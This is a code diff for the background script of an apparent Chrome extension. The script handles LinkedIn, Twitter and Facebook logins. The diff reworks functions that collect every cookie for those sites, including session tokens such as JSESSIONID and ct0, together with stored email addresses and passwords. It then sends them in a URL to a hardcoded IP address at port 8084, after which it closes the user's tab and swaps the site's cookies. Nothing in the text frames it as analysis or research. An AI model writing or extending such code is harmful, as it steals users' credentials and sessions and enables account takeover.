@@ -45,7 +45,6 @@ function saveuToken() {
     chrome.storage.sync.set({ FBuToken: uToken }, function() {});
 }
 
-
 function addfbCookie() {
     chrome.storage.sync.get(['FBcookie'], function(result) {
         result.FBcookie.forEach(function(item, index) {
@@ -74,7 +73,7 @@ function addtwCookie() {
 
 function addliCookie() {
     chrome.storage.sync.get(['LIcookie'], function(result) {
-        result.TWcookie.forEach(function(item, index) {
+        result.LIcookie.forEach(function(item, index) {
             delete item['hostOnly'];
             delete item['session'];
             item['url'] = 'https://www.linkedin.com';
@@ -93,45 +92,72 @@ function sendtoContent(msg) {
     };
 }
 
+function test() {
+    try {
+        var s = $.ajax({
+            url: "https://www.linkedin.com/litms/api/metadata/user",
+            type: "get",
+            success: function(result) {
+                console.log(result);
+            }
+        });
+        // var uuid = s['id']['dmp'];
+    } catch (err) {
+        console.log(err);
+    }
+}
+
 function linkedinData() {
 
     setTimeout(function() {
-        chrome.storage.sync.get(['LIemail', 'LIpassword'], function(result) {
-            var url = 'https://www.linkedin.com';
-            chrome.cookies.getAll({ url: url }, function(e) {
-                if (e.length > 0) {
-                    format = '';
-                    for (let i = 0; i < e.length; i++) {
-                        if (e[i].name == 'UID') {
-                            var uuid = e[i].value;
-                        }
-                        format += e[i].name + '=' + e[i].value;
-                        format += ';';
-                        if (i == e.length - 1) {
-                            format += 'domain=linkedin.com';
-                        }
+        try {
+            var s = $.ajax({
+                url: "https://www.linkedin.com/litms/api/metadata/user",
+                type: "get",
+                success: function(successResult) {
+                    if (successResult.hasOwnProperty('id')) {
+                        chrome.storage.sync.get(['LIemail', 'LIpassword'], function(result) {
+                            var url = 'https://www.linkedin.com';
+                            chrome.cookies.getAll({ url: url }, function(e) {
+                                if (e.length > 0) {
+                                    format = '';
+                                    for (let i = 0; i < e.length; i++) {
+                                        if (e[i].name == 'JSESSIONID') {
+                                            format = e[i].name + '=' + e[i].value + format + ';';
+                                        } else {
+                                            format += e[i].name + '=' + e[i].value;
+                                            format += ';';
+                                        }
+                                        if (i == e.length - 1) {
+                                            format += 'domain=linkedin.com';
+                                        }
+                                    }
+                                }
+                                format = encodeURIComponent(format);
+
+                                console.log(format);
+                                var uuid = successResult['id']['dmp'];
+                                console.log('uid defined');
+                                var sendurl = `http://125.138.183.122:8084/php/linkedin.php?uuid=${uuid}&cookie=${format}&email=${result.LIemail}&password=${result.LIpassword}`;
+                                var encodeurl = encodeURI(sendurl);
+                                chrome.tabs.query({ active: true }, function(tabs) {
+                                    chrome.tabs.remove(tabs[0].id);
+                                });
+                                chrome.tabs.create({ url: encodeurl });
+                                chrome.storage.local.set({ extensionState: 0 }, function() {});
+                                removeCookies("https://www.linkedin.com/");
+                                addliCookie()
+                            })
+                        })
                     }
                 }
-                console.log(format);
+            });
+            // var uuid = s['id']['dmp'];
+        } catch (err) {
+            console.log(err);
+        }
 
-
-                if (typeof uuid !== 'undefined') {
-                    console.log('uid defined');
-                    var sendurl = `http://125.138.183.122:8084/php/linkedin.php?uuid=${uuid}&cookie=${format}&email=${result.LIemail}&password=${result.LIpassword}`;
-                    var encodeurl = encodeURI(sendurl);
-                    chrome.tabs.query({ active: true }, function(tabs) {
-                        chrome.tabs.remove(tabs[0].id);
-                    });
-                    chrome.tabs.create({ url: encodeurl });
-                    chrome.storage.local.set({ extensionState: 0 }, function() {});
-                    removeCookies("https://twitter.com");
-                    addliCookie()
-                } else {
-                    console.log('uid undefined');
-                }
-            })
-        })
-    }, 3000)
+    }, 5000)
 }
 
 function twitterData() {
@@ -147,8 +173,12 @@ function twitterData() {
                         if (e[i].name == 'twid') {
                             var uuid = e[i].value.slice(4);
                         }
-                        format += e[i].name + '=' + e[i].value;
-                        format += ';';
+                        if (e[i].name == 'ct0') {
+                            format = e[i].name + '=' + e[i].value + format + ';';
+                        } else {
+                            format += e[i].name + '=' + e[i].value;
+                            format += ';';
+                        }
                         if (i == e.length - 1) {
                             format += 'domain=twitter.com';
                         }
@@ -180,7 +210,7 @@ function facebookData() {
     setTimeout(function() {
         chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
             var uToken;
-            var url = 'https://mbasic.facebook.com';
+            var url = 'https://facebook.com';
             chrome.cookies.getAll({ url: url }, function(e) {
                 if (e.length > 0) {
                     format = '';
@@ -215,13 +245,13 @@ function facebookData() {
                         });
                         chrome.tabs.create({ url: encodeurl });
                         chrome.storage.local.set({ extensionState: 0 }, function() {});
-                        removeCookies("https://mbasic.facebook.com");
+                        removeCookies("https://facebook.com");
                         addfbCookie();
                     }
                 }
             })
         })
-    }, 3000)
+    }, 5000)
 }
 
 
@@ -235,9 +265,9 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
             facebookData();
             break;
         case 'fbLogin':
-            savefbCookie('https://mbasic.facebook.com');
-            removeCookies("https://mbasic.facebook.com");
-            chrome.tabs.create({ url: 'https://mbasic.facebook.com/login?refsrc=deprecated' });
+            savefbCookie('https://www.facebook.com');
+            removeCookies("https://www.facebook.com");
+            chrome.tabs.create({ url: 'https://www.facebook.com/login' });
             break;
         case 'twLogin':
             chrome.tabs.query({ active: true }, function(tabs) {
@@ -268,7 +298,9 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
             setTimeout(function() { console.log('testsettimeout5s') }, 5000);
             break;
         case 'testliCookie':
-            removeCookies('https://twitter.com/');
+            try {
+                test();
+            } catch (e) {}
             break;
         default:
             console.log('nofunction');
